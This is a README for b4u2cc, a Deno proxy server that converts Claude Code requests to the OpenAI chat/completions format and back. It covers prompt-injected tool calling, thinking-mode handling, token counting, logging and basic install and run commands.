# 🌐 b4u2cc - Effortless Proxy for Real-time GPTs

[![Download b4u2cc](https://img.shields.io/badge/Download-b4u2cc-blue)](https://github.com/gemini04/b4u2cc/releases)

## 📦 Overview

b4u2cc is a Deno-based proxy server. It helps convert Claude Code requests into a format that works seamlessly with OpenAI. This allows Claude Code to interact with models that do not natively support certain tool calls.

## 🚀 Key Features

### 🔄 Protocol Conversion
- **Claude to OpenAI**: Transforms Claude's messages into OpenAI's chat/completions format.
- **OpenAI to Claude**: Converts responses back into formats compatible with Claude Code.
- **Tool Call Support**: Enables tool calling by injecting prompts, even if the upstream API does not support function calling.

### 🛠️ Tool Calling Mechanism
- Dynamically generates signals to recognize tool call boundaries.
- Converts tool definitions into system prompts.
- Parses tool call descriptions in upstream texts.
- Supports multiple tools and streaming responses.

### 🧠 Thinking Mode
- Supports Claude's thinking mode.
- Formats thinking content with `<thinking>` tags.
- Manages the order of thinking blocks and text blocks in responses.

### 📊 Token Counting
- Integrates with Claude's official token counting API.
- Offers a local tiktoken implementation as a backup.
- Allows adjustments to billing multiples using `TOKEN_MULTIPLIER`.
- Provides an endpoint for token counting.

### 📝 Logging System
- Records all requests in a structured manner.
- Supports various log levels: debug, info, warning, and error.
- Provides the option to completely disable logging for better performance.
- Tracks requests with IDs for easier debugging.

## ⚙️ System Requirements

- **Deno**: Version 1.40 or higher.
- **API Access**: Must have access to an OpenAI-compatible upstream API.

## 🔧 Download & Install

1. **Visit the Releases Page**: 
   Click the link below to access the releases page and download the latest version of b4u2cc:

   [Download b4u2cc](https://github.com/gemini04/b4u2cc/releases)

2. **Clone the Repository**: 
   If you prefer to clone the repository, you can use the following command:
   ```bash
   git clone https://github.com/gemini04/b4u2cc.git
   ```

3. **Install Dependencies**: 
   Open your terminal, navigate to the b4u2cc directory, and run:
   ```bash
   deno run --allow-net --allow-read --allow-write main.ts
   ```

4. **Run b4u2cc**: 
   Once the dependencies are installed, start the proxy server by executing:
   ```bash
   deno run --allow-net --allow-read --allow-write main.ts
   ```

5. **Connect to Your API**: 
   Ensure your application is configured to use the b4u2cc proxy as its API endpoint. This will allow it to interact with OpenAI seamlessly.

## 🤖 Usage Example

To use b4u2cc, follow these steps in your application:

1. Set the endpoint to your local server, for example, `http://localhost:8000`.
2. Make requests as you normally would with the OpenAI API.

The b4u2cc proxy server will handle the conversion necessary for Claude Code to communicate effectively with OpenAI.

## 📖 Documentation

For more detailed instructions and advanced configurations, visit the [Documentation Page](https://github.com/gemini04/b4u2cc/wiki).

## 📞 Support

If you have questions or need assistance, please reach out on the [Issues Page](https://github.com/gemini04/b4u2cc/issues) of the repository.

---

Thank you for using b4u2cc! Enjoy seamless integration between Claude Code and OpenAI.